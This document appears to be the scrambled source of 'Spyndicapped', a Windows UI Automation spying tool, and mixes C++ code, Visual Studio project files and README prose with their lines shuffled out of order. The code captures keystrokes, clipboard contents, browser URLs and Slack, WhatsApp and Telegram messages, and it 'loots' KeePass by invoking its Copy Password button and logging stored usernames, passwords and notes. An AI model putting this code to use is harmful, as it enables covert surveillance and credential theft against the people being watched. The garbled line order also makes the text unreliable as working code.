    
                
              '._.'   L
              .' '.  T
              .' '.  T        
              ._
             :  
            GlobalUnlock(hData)
            break
            clipboardData = pData
            if (g_DebugModeEnable) {
            return
            std::wcout << message << std::endl
            }
         --debug <- displays more information
         --logfile <filename> <- store all events into the log file
         --no-property-events <- disables MyPropertyChangedEventHandler
         --no-uia-events <- disables MyAutomationEventHandler
         --pid <pid> <- grabs information from that process (GUI Required)
         --timeout <sec> <- interval to process events (default 1 sec)
         --window <name> <- grabs information from that window
         Spyndicapped.exe find
         Spyndicapped.exe spy
         Spyndicapped.exe spy --pid 123
        DeleteObject(hBrush)
        DestroyWindow(hwnd)
        Displays the windows available for spying with --window or --pid
        FILE
        PAINTSTRUCT ps
        PostQuitMessage(0)
        Window(s) spying mode
        [EXAMPLES]
        break
        case DBG:
        case EMPTY:
        case INFO:
        case WARNING:
        default:
        errno_t err = _wfopen_s(
        fclose(logFile)
        if (logFile == nullptr 
        if (pData != NULL) {
        return 
        return 0
        return HRESULT_FROM_WIN32(GetLastError())
        return result
        switch (level) {
        wchar_t
        {
        }
      <Configuration>Debug</Configuration>
      <Configuration>Release</Configuration>
      <ConformanceMode>true</ConformanceMode>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <Extensions>cpp
      <Extensions>h
      <Extensions>rc
      <Filter>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <OptimizeReferences>true</OptimizeReferences>
      <Platform>Win32</Platform>
      <Platform>x64</Platform>
      <PreprocessorDefinitions>NDEBUG
      <PreprocessorDefinitions>WIN32
      <PreprocessorDefinitions>_DEBUG
      <SDLCheck>true</SDLCheck>
      <SubSystem>Console</SubSystem>
      <UniqueIdentifier>{22dd2f7c-bd51-4c42-bb2b-ce65769fe3d9}</UniqueIdentifier>
      <UniqueIdentifier>{302c9852-8b3e-4287-a6bf-4427052e2329}</UniqueIdentifier>
      <UniqueIdentifier>{42c2afac-df17-4261-b1c2-a3efd847006b}</UniqueIdentifier>
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <UniqueIdentifier>{6da74374-fe4e-45fc-954b-e4de3965ebe6}</UniqueIdentifier>
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <UniqueIdentifier>{93b97df0-0b31-4f90-ad4a-237b39578d20}</UniqueIdentifier>
      <WarningLevel>Level3</WarningLevel>
    )
    </ClCompile>
    </ClInclude>
    </Filter>
    </Link>
    </ProjectConfiguration>
    <CharacterSet>Unicode</CharacterSet>
    <ClCompile>
    <ConfigurationType>Application</ConfigurationType>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
    <Keyword>Win32Proj</Keyword>
    <Link>
    <LocalDebuggerCommandArguments>spy --debug </LocalDebuggerCommandArguments>
    <PlatformToolset>v143</PlatformToolset>
    <ProjectGuid>{cd9c66c8-8fcb-4d43-975b-a9c8d02ad090}</ProjectGuid>
    <RootNamespace>Spyndicapped</RootNamespace>
    <UseDebugLibraries>false</UseDebugLibraries>
    <UseDebugLibraries>true</UseDebugLibraries>
    <VCProjectVersion>17.0</VCProjectVersion>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    CloseClipboard()
    HGLOBAL hData = GetClipboardData(CF_UNICODETEXT)
    RECT rect
    RegisterClass(
    SetWindowPos(
    ShowWindow(
    ULONG STDMETHODCALLTYPE GetEventCount()
    ULONG eventCount = 0
    WARNING
    WNDCLASS wc = { 0 }
    case VT_ARRAY:
    case VT_BLOB:
    case VT_BLOB_OBJECT:
    case VT_BOOL:
    case VT_BSTR:
    case VT_BSTR_BLOB:
    case VT_BYREF:
    case VT_CARRAY:
    case VT_CF:
    case VT_CLSID:
    case VT_CY:
    case VT_DATE:
    case VT_DECIMAL:
    case VT_DISPATCH:
    case VT_ERROR:
    case VT_FILETIME:
    case VT_HRESULT:
    case VT_I1:
    case VT_I2:
    case VT_I4:
    case VT_I8:
    case VT_ILLEGAL:
    case VT_INT:
    case VT_INT_PTR:
    case VT_LPSTR:
    case VT_LPWSTR:
    case VT_NULL:
    case VT_PTR:
    case VT_R4:
    case VT_R8:
    case VT_RECORD:
    case VT_RESERVED:
    case VT_SAFEARRAY:
    case VT_STORAGE:
    case VT_STORED_OBJECT:
    case VT_STREAM:
    case VT_STREAMED_OBJECT:
    case VT_UI1:
    case VT_UI2:
    case VT_UI4:
    case VT_UI8:
    case VT_UINT:
    case VT_UINT_PTR:
    case VT_UNKNOWN:
    case VT_USERDEFINED:
    case VT_VARIANT:
    case VT_VECTOR:
    case VT_VERSIONED_STREAM:
    case VT_VOID:
    case WM_COMMAND:
    case WM_DESTROY:
    case WM_NCCREATE:
    case WM_NCMOUSEMOVE:
    case WM_PAINT: {
    default:
    else {
    if (!OpenClipboard(NULL)) {
    if (!g_LogFileName.empty()) {
    if (hData != NULL) {
    if (hwnd != NULL)
    if (hwnd)
    if (itr != end 
    if (vVar.vt == VT_EMPTY) {
    return S_OK
    return nullptr
    return result
    std::lock_guard<std::mutex> lock(logMutex)
    std::wstring result
    switch (msg) {
    switch (vVar.vt) {
    void STDMETHODCALLTYPE IncrementEventCount()
    wc.hInstance = GetModuleHandle(NULL)
    wc.lpfnWndProc = OverlayWndProc
    wchar_t
    {
    }
   // SetLayeredWindowAttributes(
  :_
  </ImportGroup>
  </ItemDefinitionGroup>
  </ItemGroup>
  </PropertyGroup>
  <ItemGroup>
 (std::wstring(vVar.bstrVal) == oldTextValue) 
 // grey color
 And log everything into the file
 Find target and spy by the pid
 FindFirstAscending(IUIAutomationElement
 Finder::GetUIAElementByName(IUIAutomation
 Finder::GetUIAElementByPID(IUIAutomation
 GetModuleNameFromPid(pid) 
 GetPAutomation()
 GetPTreeWalker()
 GetParent(IUIAutomationElement
 GetUIAElementByName(IUIAutomation
 GetUIAElementByPID(IUIAutomation
 Helpers::HandleVariant(vVar)
 How it works
 IsWindowVisible(handle)))
 MyTreeWalker::FindFirstAscending(IUIAutomationElement
 MyTreeWalker::GetPAutomation()
 MyTreeWalker::GetPTreeWalker()
 MyTreeWalker::GetParent(IUIAutomationElement
 Spy the whole system (high load may be!)
 Spyndicapped
 SysStringLen(
 UIA basic event processing (Ex: opened a new window)
 Usage examples
 Visual Studio Version 17
 Window name: Unknown 
 argv[])
 bDbName == NULL)
 bWindowName)
 child)
 clipboardData)
 clipboardData) {
 count > 0) {
 data = 
 data) noexcept
 data) noexcept {
 err != 0)
 eventID == UIA_Text_TextSelectionChangedEventId))
 fullPath)
 fullPath) {
 g_pMyTreeWalker
 g_pMyTreeWalker = NULL
 getCmdOption(wchar_t
 hash) 
 i < count
 i < eventIds.size()
 i < length
 i < propertyIds.size()
 input)
 logFile = nullptr
 option)
 overLayHwnd)
 pAutomation = NULL
 pAutomation = g_pMyTreeWalker->GetPAutomation()
 pAutomationCondition)
 pAutomationElement
 pAutomationElement = NULL
 pAutomationElement)
 pBranchDbTreeElementCondition == NULL)
 pChild)
 pConditionToElementArrayWithoutHelpButtons == NULL)
 pCopyPasswordButton != NULL)
 pData = static_cast<wchar_t
 pDbTreeElementCondition == NULL)
 pDropDownMenu != NULL)
 pElementArrayWithoutHelpButtons == NULL)
 pEntryChild == NULL)
 pFoundElement != NULL) {
 pFoundElement = NULL
 pInvokePattern != NULL)
 pMyAutomationEventHandler = new MyAutomationEventHandler()
 pMyPropertyChangedEventHandler = new MyPropertyChangedEventHandler()
 pOverlayWnd)
 pParent = NULL
 pPassListCondition == NULL)
 pRootElement = NULL
 pTrueCondition == NULL)
 pUIAutomation)
 pWalker = NULL
 ppInterface)
 propId == UIA_ValueValuePropertyId) 
 propId == UIA_ValueValuePropertyId))
 property changed event handling (Ex: inserted a value).
 rect.bottom) / 2 }
 static_cast<uint32_t>(c)
 std::to_wstring(count) 
 std::to_wstring(i) 
 std::to_wstring(pid) 
 std::to_wstring(propId)
 std::to_wstring(static_cast<int>(vVar.bVal))
 std::to_wstring(static_cast<unsigned int>(vVar.bVal))
 std::to_wstring(vVar.cyVal.int64)
 std::to_wstring(vVar.date)
 std::to_wstring(vVar.dblVal)
 std::to_wstring(vVar.fltVal)
 std::to_wstring(vVar.iVal)
 std::to_wstring(vVar.intVal)
 std::to_wstring(vVar.lVal)
 std::to_wstring(vVar.llVal)
 std::to_wstring(vVar.scode)
 std::to_wstring(vVar.uiVal)
 std::to_wstring(vVar.uintVal)
 std::to_wstring(vVar.ulVal)
 std::to_wstring(vVar.ullVal)
 std::wstring(bClassName)
 std::wstring(bLocalizedControlType)
 std::wstring(bLocalizedControlType) 
 std::wstring(bMsgReceiver)
 std::wstring(bNotes)
 std::wstring(bPassword)
 std::wstring(bTitleName)
 std::wstring(bURL)
 std::wstring(bUserName)
 std::wstring(bWindowName)
 std::wstring(vHelp.bstrVal)
 std::wstring(vMsgValue.bstrVal)
 std::wstring(vValue.bstrVal)
 std::wstring(vValue.bstrVal) 
 std::wstring(vVar.boolVal 
 std::wstring(vVar.bstrVal)
 std::wstring(wsControlType)
 string)
 url)
 url) {
 vAriaRoleValue.bstrVal == NULL 
 vIAccessibleRoleValue.iVal != 42)
 vValue.bstrVal == NULL 
 vVar.vt == VT_EMPTY)
 windowName = NULL
 windowName)
 wsClipBoardData
 wsDate)
 wsEventString 
 wsProcName 
 wsWindowName 
 } }
"                fwprintf(logFile, L""[DEBUG] %ls"
"                std::wcout << L""[DEBUG] "" << message << std::endl"
"            fwprintf(logFile, L""%ls"
"            fwprintf(logFile, L""[INFO] %ls"
"            fwprintf(logFile, L""[WARNING] %ls"
"            std::wcout << L""Can't create logfile"" << std::endl"
"            std::wcout << L""[INFO] "" << message << std::endl"
"            std::wcout << L""[WARNING] "" << message << std::endl"
"         --ignore-handlers <- I have created handlers for various apps, but u can use the generic HandleOther() with this flag"
"         Spyndicapped.exe spy --window ""Program Manager"""
"        EndPaint(hwnd, "
"        FillRect(hdc, "
"        HBRUSH hBrush = CreateSolidBrush(RGB(192, 192, 192))"
"        HDC hdc = BeginPaint(hwnd, "
"        L""OverlayClass"", L""Overlay"", WS_POPUP,"
"        NULL, NULL, wc.hInstance, NULL"
"        ShowWindow(hwnd, SW_HIDE)"
"        WS_EX_OVERLAPPEDWINDOW,"
"        _setmode(_fileno(logFile), _O_U16TEXT)"
"        rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, "
"        result = L""Variant is ARRAY."""
"        result = L""Variant is BLOB."""
"        result = L""Variant is BLOB_OBJECT."""
"        result = L""Variant is BSTR: "" "
"        result = L""Variant is BSTR_BLOB."""
"        result = L""Variant is BYREF."""
"        result = L""Variant is C array."""
"        result = L""Variant is CF."""
"        result = L""Variant is CLSID."""
"        result = L""Variant is FILETIME."""
"        result = L""Variant is HRESULT: "" "
"        result = L""Variant is IDispatch."""
"        result = L""Variant is ILLEGAL."""
"        result = L""Variant is INT_PTR."""
"        result = L""Variant is IUnknown."""
"        result = L""Variant is LPSTR."""
"        result = L""Variant is LPWSTR."""
"        result = L""Variant is NULL."""
"        result = L""Variant is RECORD."""
"        result = L""Variant is RESERVED."""
"        result = L""Variant is SAFEARRAY."""
"        result = L""Variant is STORAGE."""
"        result = L""Variant is STORED_OBJECT."""
"        result = L""Variant is STREAM."""
"        result = L""Variant is STREAMED_OBJECT."""
"        result = L""Variant is UINT_PTR."""
"        result = L""Variant is VECTOR."""
"        result = L""Variant is VERSIONED_STREAM."""
"        result = L""Variant is another variant."""
"        result = L""Variant is bool: "" "
"        result = L""Variant is currency: "" "
"        result = L""Variant is date: "" "
"        result = L""Variant is decimal."""
"        result = L""Variant is double: "" "
"        result = L""Variant is empty."""
"        result = L""Variant is error: "" "
"        result = L""Variant is float: "" "
"        result = L""Variant is int16: "" "
"        result = L""Variant is int32: "" "
"        result = L""Variant is int64: "" "
"        result = L""Variant is int8: "" "
"        result = L""Variant is int: "" "
"        result = L""Variant is of unknown type."""
"        result = L""Variant is pointer."""
"        result = L""Variant is uint16: "" "
"        result = L""Variant is uint32: "" "
"        result = L""Variant is uint64: "" "
"        result = L""Variant is uint8: "" "
"        result = L""Variant is uint: "" "
"        result = L""Variant is user-defined type."""
"        result = L""Variant is void."""
"    <ClCompile Include=""Args.cpp"" />"
"    <ClCompile Include=""Args.cpp"">"
"    <ClCompile Include=""Errors.cpp"" />"
"    <ClCompile Include=""Errors.cpp"">"
"    <ClCompile Include=""Finder.cpp"" />"
"    <ClCompile Include=""Finder.cpp"">"
"    <ClCompile Include=""Helpers.cpp"" />"
"    <ClCompile Include=""Helpers.cpp"">"
"    <ClCompile Include=""Logger.cpp"" />"
"    <ClCompile Include=""Logger.cpp"">"
"    <ClCompile Include=""Main.cpp"" />"
"    <ClCompile Include=""Main.cpp"">"
"    <ClCompile Include=""MyAutomationEventHandler.cpp"" />"
"    <ClCompile Include=""MyAutomationEventHandler.cpp"">"
"    <ClCompile Include=""MyAutomationEventHandlerApps.cpp"" />"
"    <ClCompile Include=""MyAutomationEventHandlerApps.cpp"">"
"    <ClCompile Include=""MyPropertyChangedEventHandler.cpp"" />"
"    <ClCompile Include=""MyPropertyChangedEventHandler.cpp"">"
"    <ClCompile Include=""MyPropertyChangedEventHandlerApps.cpp"" />"
"    <ClCompile Include=""MyPropertyChangedEventHandlerApps.cpp"">"
"    <ClCompile Include=""MyTreeWalker.cpp"" />"
"    <ClCompile Include=""MyTreeWalker.cpp"">"
"    <ClInclude Include=""Args.h"" />"
"    <ClInclude Include=""Args.h"">"
"    <ClInclude Include=""Errors.h"" />"
"    <ClInclude Include=""Errors.h"">"
"    <ClInclude Include=""Finder.h"" />"
"    <ClInclude Include=""Finder.h"">"
"    <ClInclude Include=""Helpers.h"" />"
"    <ClInclude Include=""Helpers.h"">"
"    <ClInclude Include=""Logger.h"" />"
"    <ClInclude Include=""Logger.h"">"
"    <ClInclude Include=""Main.h"" />"
"    <ClInclude Include=""Main.h"">"
"    <ClInclude Include=""MyAutomationEventHandler.h"" />"
"    <ClInclude Include=""MyAutomationEventHandler.h"">"
"    <ClInclude Include=""MyAutomationEventHandlerApps.h"" />"
"    <ClInclude Include=""MyAutomationEventHandlerApps.h"">"
"    <ClInclude Include=""MyPropertyChangedEventHandler.h"" />"
"    <ClInclude Include=""MyPropertyChangedEventHandler.h"">"
"    <ClInclude Include=""MyPropertyChangedEventHandlerApps.h"" />"
"    <ClInclude Include=""MyPropertyChangedEventHandlerApps.h"">"
"    <ClInclude Include=""MyTreeWalker.h"" />"
"    <ClInclude Include=""MyTreeWalker.h"">"
"    <Filter Include="""
"    <Import Project=""$(UserRootDir)"
"    <ProjectConfiguration Include=""Debug"
"    <ProjectConfiguration Include=""Release"
"    DBG,"
"    EMPTY,"
"    GetWindowRect(hwnd, "
"    INFO,"
"    return DefWindowProc(hwnd, msg, wParam, lParam)"
"    return std::find(begin, end, option) != end"
"    wc.lpszClassName = L""OverlayClass"""
"  <Import Project=""$(VCTargetsPath)"
"  <ImportGroup Label=""ExtensionSettings"">"
"  <ImportGroup Label=""ExtensionTargets"">"
"  <ImportGroup Label=""PropertySheets"" Condition=""'$(Configuration)"
"  <ImportGroup Label=""Shared"">"
"  <ItemDefinitionGroup Condition=""'$(Configuration)"
"  <ItemGroup Label=""ProjectConfigurations"">"
"  <PropertyGroup Condition=""'$(Configuration)"
"  <PropertyGroup Label=""Globals"">"
"  <PropertyGroup Label=""UserMacros"" />"
" !(GetWindow(handle, GW_OWNER) == (HWND)0 "
" (cmdOptionExists(argv, argv "
" :)"" "
" L"" "" "
" L"" Time: "" "
" L"" [ "" "
" L"" [ New Web WhatsApp Message ]"""
" L"" ["" "
" L"" [New Web Slack Message]"""
" L"" ]"""
" L"" from "" "
" L"" stored passwords"", INFO)"
" L""] "" "
" L""]"""
" L""true"" : L""false"")"
" Name: "" "
" PID: "" "
" PID: Unknown "" "
" PROCESS_VM_READ, FALSE, pid)"
" Window name: "" "
" argc, L""--debug""))"
" argc, L""--help"")) )"
" argc, L""--ignore-handlers""))"
" argc, L""--logfile"")"
" argc, L""--logfile""))"
" argc, L""--no-property-events""))"
" argc, L""--no-uia-events""))"
" argc, L""--pid"")"
" argc, L""--pid""))"
" argc, L""--timeout"")"
" argc, L""--timeout""))"
" argc, L""--window"")"
" argc, L""--window""))"
" argc, L""-h"") "
" argc, L""find""))"
" argc, L""spy""))"
" begin, wchar_t"
" end, const std::wstring"
" itr = std::find(begin, end, option)"
" message, LogLevel level) {"
" message, LogLevel level)"
" pAutomation, DWORD pid)"
" pAutomation, IUIAutomationElement"
" pAutomation, wchar_t"
" pAutomationElement, BSTR"
" pAutomationElement, EVENTID eventID)"
" pAutomationElement, PROPERTYID propId, VARIANT vVar)"
" pAutomationElement, const std::wstring"
" pAutomationElement, int timeout)"
" pAutomationElementChild, BSTR"
" pStartElement, IUIAutomationCondition"
" propertyArray = SafeArrayCreateVector(VT_I4, 0, propertyIds.size())"
" rect.right) / 2, (rect.top "
" std::to_wstring(eventIds[i]), WARNING)"
" std::to_wstring(length), INFO)"
" std::to_wstring(pid), DBG)"
" std::wstring(bDbName), INFO)"
" std::wstring(errMsg), WARNING)"
" std::wstring(windowName), DBG)"
" wcscmp(previousDb, bDbName) == 0)"
" wcscmp(vAriaRoleValue.bstrVal, L""textbox"") != 0)"
" wcscmp(vValue.bstrVal, L""Header"") == 0)"
" wname, INFO)"
" wsDate, DBG)"
" wsDate, EVENTID eventID)"
" wsDate, PROPERTYID propId, VARIANT vVar)"
" wsEventString, DBG)"
" wsEventString, const std::wstring"
" wsProcName, const std::wstring"
" wsUrl, DBG)"
" } },"
""" "" << std::endl"
"""Program Manager"
")"" << std::endl"
", IUIAutomationElement"
", PROPERTYID, VARIANT)"
", int)"
"// don't forget about adding property handling in ""MyPropertyChangedEventHandlerApps.cpp"""
"//Log(L""HandleFirefox() Invoked"", DBG)"
"//Log(L""HandleKeepass() in Property Invoked"", DBG)"
"//Log(L""HandleOther() Invoked"", DBG)"
"//Log(L""HandleOther() in Property Invoked"", DBG)"
"//Log(L""Property changed"", DBG)"
"//Log(L""Successfully find Copy Password field!"", DBG)"
"//Log(L""Too fast events..."", DBG)"
"//Log(L""URL: "" "
"<< L"" "
"<Project DefaultTargets=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
"<Project ToolsVersion=""Current"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
"= L"""
"BOOL CALLBACK enum_windows_callback(HWND handle, LPARAM lParam)"
"EnumWindows(enum_windows_callback, (LPARAM)"
"GetWindowThreadProcessId(handle, "
"HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::QueryInterface(REFIID riid, void"
"HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::QueryInterface(REFIID riid, void"
"HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void"
"HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED)"
"HRESULT hr = pAutomation->AddAutomationEventHandler(eventIds[i], pAutomationElement, TreeScope_Subtree, NULL, (IUIAutomationEventHandler"
"HRESULT hr = pAutomationElement->GetCurrentPropertyValue(UIA_ProcessIdPropertyId, "
"HRESULT hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, "
"HRESULT hr = pCurrentElement->FindFirst(TreeScope_Subtree, pAutomationCondition, "
"HRESULT hr = pWalker->GetParentElement(pChild, "
"HandleOther(pAutomationElement, wsProcName, wsDate, propId, vVar)"
"HandleOther(pAutomationElement, wsProcName, wsEventString, wsDate, eventID)"
"In addition, the tool can parse Telegram messages:"
"In fact, I have two handlers:"
"L""["" "
"LRESULT CALLBACK OverlayWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {"
"L___,"
"Log(L""Arrived unknown event in HandleFirefox(). How to process that"
"Log(L""Arrived unknown event in HandleOther(). How to process that"
"Log(L""Can't create condition for password elements"", DBG)"
"Log(L""Can't create database property condition"", DBG)"
"Log(L""Can't create m_lvEntries property condition"", DBG)"
"Log(L""Can't create property arrray"", WARNING)"
"Log(L""Can't create property condition"", DBG)"
"Log(L""Can't create true condition"", DBG)"
"Log(L""Can't create true property condition"", DBG)"
"Log(L""Can't find Database tree element"", DBG)"
"Log(L""Can't find msg receiver gui element"", DBG)"
"Log(L""Can't find navigation bar of firefox!"", DBG)"
"Log(L""Can't find parent element"", DBG)"
"Log(L""Can't find password list in keepass.exe"", DBG)"
"Log(L""Can't find passwords in the list"", DBG)"
"Log(L""Can't find selected db. May be we are in the root"", DBG)"
"Log(L""Can't get current class name"", DBG)"
"Log(L""Can't get current control type"", DBG)"
"Log(L""Can't get db name"", DBG)"
"Log(L""Can't get element from list in keepass.exe"", DBG)"
"Log(L""Can't get help property value"", DBG)"
"Log(L""Can't get localized control type"", DBG)"
"Log(L""Can't get msg receiver name"", DBG)"
"Log(L""Can't get name of the Web Slack Message field"", DBG)"
"Log(L""Can't get pAutomation from g_pMyTreeWalker in HandleKeepass()"", DBG)"
"Log(L""Can't get pAutomation from g_pMyTreeWalker()"", DBG)"
"Log(L""Can't get property value"", WARNING)"
"Log(L""Can't get url value"", WARNING)"
"Log(L""Can't get value of the Web Slack Message field"", DBG)"
"Log(L""Can't get window name value"", WARNING)"
"Log(L""Can't get window name"", DBG)"
"Log(L""Cant find GUI by pid!!!. Try to use --windowname"", WARNING)"
"Log(L""Cant find GUI by windowname!!!. Try to use --pid"", WARNING)"
"Log(L""Cant find HWND"", WARNING)"
"Log(L""Cant find profile info"", DBG)"
"Log(L""Cant get AriaRolePropertyId from WebWhatsappFF handler"", DBG)"
"Log(L""Cant get LegacyIAccessibleRolePropertyId from WebWhatsappFF handler"", DBG)"
"Log(L""Cant get msg contents"", DBG)"
"Log(L""Cant get pAutomation from g_pMyTreeWalker"", DBG)"
"Log(L""Cant get treewalker"", DBG)"
"Log(L""CoCreateInstance() failed"", WARNING)"
"Log(L""CoInitializeEx() failed"", WARNING)"
"Log(L""Database: "" "
"Log(L""Failed to add event handler for event ID: "" "
"Log(L""Failed to add property changed event handler"" , WARNING)"
"Log(L""Failed to create TreeWalker. pUIAutomation was NULL"", WARNING)"
"Log(L""Failed to create TreeWalker."", WARNING)"
"Log(L""Failed to find windows!"", WARNING)"
"Log(L""Failed to get parent name"", DBG)"
"Log(L""Failed to get parent."", WARNING)"
"Log(L""FindWindows() success"", DBG)"
"Log(L""Found "" "
"Log(L""Found active windows: "" "
"Log(L""HandleExplorer() Invoked"", DBG)"
"Log(L""IUIAutomation creating success"", DBG)"
"Log(L""IUIAutomation->CreateTrueCondition() success"", DBG)"
"Log(L""IUIAutomation->GetRootElement() creating success"", DBG)"
"Log(L""Monitoring from root"", INFO)"
"Log(L""MyAutomationEventHandler::HandleAutomationEvent() invalid PID Received"", DBG)"
"Log(L""MyAutomationEventHandler::HandleAutomationEvent() invalid wsProcName Received"", DBG)"
"Log(L""New property event from "" "
"Log(L""New uia event "" "
"Log(L""See everything into the log files"", INFO)"
"Log(L""Spying "" "
"Log(L""Started spying using MyAutomationEventHandler"", INFO)"
"Log(L""Started spying using MyPropertyChangedEventHandler"", INFO)"
"Log(L""Todo :))"", INFO)"
"Log(L""Window Name for MyAutomationEventHandler(): "" "
"Log(L""Window Name for MyPropertyChangedEventHandler(): "" "
"Log(L""[-] Err msg: "" "
"Log(L""pAutomation->CreatePropertyCondition() failed"", WARNING)"
"Log(L""pAutomation->CreateTrueCondition() failed"", WARNING)"
"Log(L""pAutomation->FindAll() failed"", WARNING)"
"Log(L""pAutomation->GetRootElement() failed"", WARNING)"
"Log(L""pChildEl->GetCurrentPropertyValue(PID) failed"", DBG)"
"Log(L""pChildEl->get_CurrentName() failed"", DBG)"
"Log(L""pElementsArray->GetElement() failed"", DBG)"
"Log(L""pRootElement->FindAll() failed"", WARNING)"
"Log(L""pWalker was null"", WARNING)"
"Log(wsLogKeyStroke, EMPTY)"
"Main"">"
"Microsoft Visual Studio Solution File, Format Version 12.00"
"Microsoft.Cpp.$(Platform).user.props"" Condition=""exists('$(UserRootDir)"
"Microsoft.Cpp.$(Platform).user.props')"" Label=""LocalAppDataPlatform"" />"
"Microsoft.Cpp.Default.props"" />"
"Microsoft.Cpp.props"" />"
"Microsoft.Cpp.targets"" />"
"MyAutomationEventHandler"">"
"MyAutomationEventHandler::MyAutomationEventHandler() : refCount(1), eventCount(0)"
"MyPropertyChangedEventHandler"">"
"MyPropertyChangedEventHandler::HandleOther(pAutomationElement, wsProcName, wsDate, propId, vVar)"
"MyPropertyChangedEventHandler::MyPropertyChangedEventHandler() : refCount(1), eventCount(0)"
"MyTreeWalker"">"
"Note that the tool captures the text you enter, shows the sender's name and the recipient's name. In this case, I'm writing a message to a chat."
"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""Spyndicapped"", ""Spyndicapped"
"SafeArrayPutElement(propertyArray, "
"SetConsoleTextAttribute(hConsole, 0x07)"
"SetConsoleTextAttribute(hConsole, 0x0C)"
"SetCursorPos(originalCursorPos.x, originalCursorPos.y)"
"SetCursorPos(pt.x, pt.y)"
"So, there is a Windows User Automation framework that allows you to work with any Windows graphical elements. I just studied it over the New Year holidays and made a small POC :P It just so happens that in parallel I became an expert in Windows programming for handicapped people. Why didn't anyone tell me about this when I first started learning pentest"
"Spyndicapped.vcxproj"", ""{CD9C66C8-8FCB-4D43-975B-A9C8D02AD090}"""
"They handle all the GUI changes we are interested in: data input, text copying, data modification. Among other things, I've added handlers under different processes and even domains in the browser so you can get more familiar with the framework! See the examples below for more details. Also, I added an example of using patterns (one of the UIA components) on the example of KeePass looting."
"UIA_AutomationPropertyChangedEventId,"
"UIA_Invoke_InvokedEventId,"
"UIA_NamePropertyId,"
"UIA_SelectionItemIsSelectedPropertyId,"
"UIA_Text_TextChangedEventId,"
"UIA_Text_TextSelectionChangedEventId,"
"UIA_ValueValuePropertyId,"
"Win32"">"
"Win32'"" Label=""Configuration"">"
"Win32'"">"
"With this project you will be able to learn Windows UIA! I use almost all concepts: event handling, pattern calling, tree traversal, item lookup."
"_setmode(_fileno(stdout), _O_U16TEXT)"
"automationThread = std::thread(MyAutomationEventHandler::Deploy, pAutomation, pAutomationElement, timeout)"
"bDbName = SysAllocString(L""Database"")"
"domain = domain.substr(0, pos)"
"else if ( cmdOptionExists(argv, argv "
"else if (cmdOptionExists(argv, argv "
"g_LogFileName = getCmdOption(argv, argv "
"hr = CoCreateInstance(__uuidof(CUIAutomation), NULL, CLSCTX_INPROC_SERVER, __uuidof(IUIAutomation), (void"
"hr = g_pMyTreeWalker->GetFirstAscendingWindowName(pAutomationElement, "
"hr = pAutomation->AddPropertyChangedEventHandler(pAutomationElement, TreeScope_Subtree, NULL, pMyPropertyChangedEventHandler, propertyArray)"
"hr = pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, _variant_t(L""m_lvEntries""), "
"hr = pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, vAutomationId, "
"hr = pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, _variant_t(UIA_ListItemControlTypeId), "
"hr = pAutomation->CreatePropertyCondition(UIA_NamePropertyId, _variant_t(L""Database""), "
"hr = pAutomation->CreatePropertyCondition(UIA_NamePropertyId, vWindowName, "
"hr = pAutomation->CreatePropertyCondition(UIA_SelectionItemIsSelectedPropertyId, _variant_t(true), "
"hr = pAutomationElement->GetCurrentPropertyValue(UIA_AriaRolePropertyId, "
"hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleHelpPropertyId, "
"hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleRolePropertyId, "
"hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, "
"hr = pAutomationElementUrlBar->GetCurrentPropertyValue(UIA_ValueValuePropertyId, "
"hr = pCopyPasswordButton->GetCurrentPattern(UIA_InvokePatternId, (IUnknown"
"hr = pDropDownMenu->FindFirst(TreeScope_Children, pCopyPasswordButtonCondition, "
"hr = pElementArray->GetElement(0, "
"hr = pElementArrayWithoutHelpButtons->GetElement(i, "
"hr = pElementsArray->GetElement(i, "
"hr = pEntryChild->GetElement(0, "
"hr = pEntryChild->GetElement(1, "
"hr = pEntryChild->GetElement(2, "
"hr = pEntryChild->GetElement(3, "
"hr = pEntryChild->GetElement(4, "
"hr = pEntryElement->FindAll(TreeScope_Children, pTrueCondition, "
"hr = pEntryElement->GetCurrentPropertyValue(UIA_AutomationIdPropertyId, "
"hr = pMainWindow->FindFirst(TreeScope_Children, pDropDownMenuCondition, "
"hr = pPassListEl->FindAll(TreeScope_Children, pConditionToElementArrayWithoutHelpButtons, "
"hr = pRootElement->FindAll(TreeScope_Children, pCondition, "
"hr = pTargetElement->FindAll(TreeScope_Children, pCondition, "
"hr = pWalker->GetNextSiblingElement(pAutomationElementProfileInfo, "
"if (!cmdOptionExists(argv, argv "
"if (EnumProcessModules(hProcess, hMods, sizeof(hMods), "
"if (GetModuleFileNameEx(hProcess, hMods[0], moduleName, sizeof(moduleName) / sizeof(wchar_t))) {"
"if (cmdOptionExists(argv, argv "
"include ""Args.h"""
"include ""Errors.h"""
"include ""Finder.h"""
"include ""Helpers.h"""
"include ""Logger.h"""
"include ""Main.h"""
"include ""MyAutomationEventHandler.h"""
"include ""MyAutomationEventHandlerApps.h"""
